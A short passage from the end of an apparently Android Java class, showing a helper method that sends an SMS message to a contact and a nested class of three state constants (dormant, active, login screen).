	private void sendSms(String textMsg, String Contact) {
    	sm.sendTextMessage(Contact, null,textMsg, null, null);
	}
	public static class MSStates {
		public static final int MS_DORMANT = 0;
		public static final int MS_ACTIVE = 1;
		public static final int MS_LOGINSCREEN = 2;
	}

	
}
